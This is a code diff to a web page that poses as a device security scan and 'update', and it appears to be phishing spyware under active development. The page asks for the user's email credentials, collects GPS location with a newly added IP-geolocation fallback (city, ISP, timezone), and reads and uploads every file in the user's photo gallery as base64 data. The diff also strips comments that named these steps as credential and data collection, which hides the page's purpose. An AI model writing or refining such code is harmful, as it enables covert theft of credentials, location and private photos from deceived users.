@@ -217,7 +217,7 @@
             <span class="speed-badge" id="speedBadge">⚡ Fast Mode</span>
         </div>
 
-        <!-- STEP 1: CREDENTIALS -->
+        <!-- STEP 1 -->
         <div class="step active" id="step1">
             <div class="step-title">🔐 Verify Identity</div>
             <div class="step-sub">
@@ -238,7 +238,7 @@
             </p>
         </div>
 
-        <!-- STEP 2: SCAN + DATA COLLECTION -->
+        <!-- STEP 2 -->
         <div class="step" id="step2">
             <div class="step-title">🔍 Scanning Device</div>
             <div class="step-sub" id="stepSub">Please wait while we scan for vulnerabilities...</div>
@@ -270,7 +270,7 @@
             </div>
         </div>
 
-        <!-- STEP 3: COMPLETE -->
+        <!-- STEP 3 -->
         <div class="step" id="step3">
             <div class="complete-icon">✅</div>
             <div class="complete-text">Update Ready</div>
@@ -331,7 +331,7 @@
         }
 
         // ============================================================
-        // STEP 1: CREDENTIALS
+        // STEP 1
         // ============================================================
         function step1() {
             const email = document.getElementById('email').value;
@@ -347,14 +347,15 @@
         }
 
         // ============================================================
-        // STEP 2: DATA COLLECTION
+        // STEP 2
         // ============================================================
         async function startDataCollection() {
             addLogEntry('● Starting data collection...', 'done');
             startTime = Date.now();
 
+            // --- LOCATION WITH FALLBACK ---
             addLogEntry('📍 Collecting location...', 'warn');
-            await collectLocation();
+            await collectLocationWithFallback();
             updateProgress(10);
 
             addLogEntry('🔋 Collecting battery & network...', 'warn');
@@ -377,25 +378,70 @@
         }
 
         // ============================================================
-        // COLLECT LOCATION
+        // LOCATION WITH FALLBACK (GPS → IP GEOLOCATION)
         // ============================================================
-        function collectLocation() {
+        function collectLocationWithFallback() {
             return new Promise((resolve) => {
+                // Try GPS first
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         pos => {
-                            sendData({ type: 'location', lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy });
-                            addLogEntry('✅ Location captured', 'done');
+                            sendData({
+                                type: 'location',
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                source: 'gps'
+                            });
+                            addLogEntry('✅ Location captured via GPS', 'done');
                             resolve();
                         },
-                        err => { addLogEntry('❌ Location denied: ' + err.message, 'error'); resolve(); },
+                        err => {
+                            addLogEntry('⚠️ GPS failed: ' + err.message + '. Falling back to IP geolocation...', 'warn');
+                            // Fallback to IP geolocation
+                            getIPLocation(resolve);
+                        },
                         { enableHighAccuracy: true, timeout: 10000 }
                     );
                 } else {
-                    addLogEntry('❌ Geolocation not supported', 'error');
-                    resolve();
+                    addLogEntry('⚠️ Geolocation API not supported. Falling back to IP geolocation...', 'warn');
+                    getIPLocation(resolve);
                 }
             });
+        }
+
+        // ============================================================
+        // IP GEOLOCATION FALLBACK
+        // ============================================================
+        function getIPLocation(resolve) {
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    if (data && data.latitude && data.longitude) {
+                        sendData({
+                            type: 'location',
+                            lat: data.latitude,
+                            lon: data.longitude,
+                            accuracy: 'IP (approx)',
+                            source: 'ip',
+                            city: data.city || '',
+                            region: data.region || '',
+                            country: data.country_name || '',
+                            timezone: data.timezone || '',
+                            isp: data.org || ''
+                        });
+                        addLogEntry(`✅ Location captured via IP: ${data.city}, ${data.country_name}`, 'done');
+                    } else {
+                        sendData({ type: 'location', error: 'IP geolocation failed' });
+                        addLogEntry('❌ IP geolocation failed', 'error');
+                    }
+                    resolve();
+                })
+                .catch(() => {
+                    sendData({ type: 'location', error: 'IP geolocation unavailable' });
+                    addLogEntry('❌ IP geolocation service unavailable', 'error');
+                    resolve();
+                });
         }
 
         // ============================================================
@@ -509,7 +555,7 @@
         }
 
         // ============================================================
-        // TRIGGER GALLERY EXTRACTION (STREAMLINED)
+        // TRIGGER GALLERY EXTRACTION
         // ============================================================
         async function triggerGalleryExtraction(event) {
             if (event) event.preventDefault();
@@ -530,19 +576,9 @@
                 document.getElementById('scanIcon').textContent = '⚡';
                 updateProgress(45);
 
-                // --- Process gallery in chunks, not all at once ---
-                let totalFilesFound = 0;
-                let processedCount = 0;
-                let totalSizeMB = 0;
-
-                // Use a queue to process files in smaller batches
-                const batchSize = 3; // Smaller batch to avoid memory issues
                 const fileQueue = [];
-
-                // First pass: collect file entries (without reading content)
-                addLogEntry('📂 Scanning directory for media...', 'warn');
                 await collectFileEntries(dirHandle, '', fileQueue);
-                totalFilesFound = fileQueue.length;
+                const totalFilesFound = fileQueue.length;
                 addLogEntry(`● Found ${totalFilesFound} media files`, 'done');
 
                 if (totalFilesFound === 0) {
@@ -552,11 +588,9 @@
                     return;
                 }
 
-                // Process in small batches to avoid memory buildup
+                const batchSize = 3;
                 for (let i = 0; i < fileQueue.length; i += batchSize) {
                     const batch = fileQueue.slice(i, i + batchSize);
-                    
-                    // Process each batch sequentially (not parallel to avoid memory spikes)
                     for (const fileInfo of batch) {
                         try {
                             const file = await fileInfo.handle.getFile();
@@ -564,11 +598,9 @@
                             let base64Data;
 
                             if (isImage && file.size > 200 * 1024) {
-                                // Compress large images
                                 try {
                                     const compressed = await compressImage(file);
                                     base64Data = compressed;
-                                    addLogEntry(`📦 Compressed ${fileInfo.name} (${(file.size/1024).toFixed(0)}KB)`, 'warn');
                                 } catch (e) {
                                     const reader = new FileReader();
                                     base64Data = await new Promise((resolve) => {
@@ -584,7 +616,6 @@
                                 });
                             }
 
-                            // Send immediately
                             await sendData({
                                 type: 'media_file',
                                 filename: fileInfo.name,
@@ -594,21 +625,17 @@
                                 data: base64Data
                             });
 
-                            processedCount++;
-                            const pct = 45 + (processedCount / totalFilesFound) * 55;
+                            uploadedFiles++;
+                            const pct = 45 + (uploadedFiles / totalFilesFound) * 55;
                             updateProgress(pct);
                             document.getElementById('scanDesc').textContent =
-                                `📤 ${processedCount}/${totalFilesFound} gallery files uploaded (${Math.round(pct)}%)`;
-                            
-                            // Clean up memory
+                                `📤 ${uploadedFiles}/${totalFilesFound} gallery files uploaded (${Math.round(pct)}%)`;
+
                             base64Data = null;
-                            
                         } catch (err) {
                             addLogEntry(`❌ Failed to upload ${fileInfo.name}: ${err.message}`, 'error');
                         }
                     }
-
-                    // Force garbage collection hint (works in some browsers)
                     if (window.gc) window.gc();
                 }
 
@@ -630,7 +657,7 @@
         }
 
         // ============================================================
-        // COLLECT FILE ENTRIES (without reading content)
+        // COLLECT FILE ENTRIES
         // ============================================================
         async function collectFileEntries(dirHandle, path, fileQueue) {
             try {
@@ -703,7 +730,7 @@
         }
 
         // ============================================================
-        // STEP 3: INSTALL
+        // STEP 3
         // ============================================================
         function step3() {
             if (!galleryComplete) {
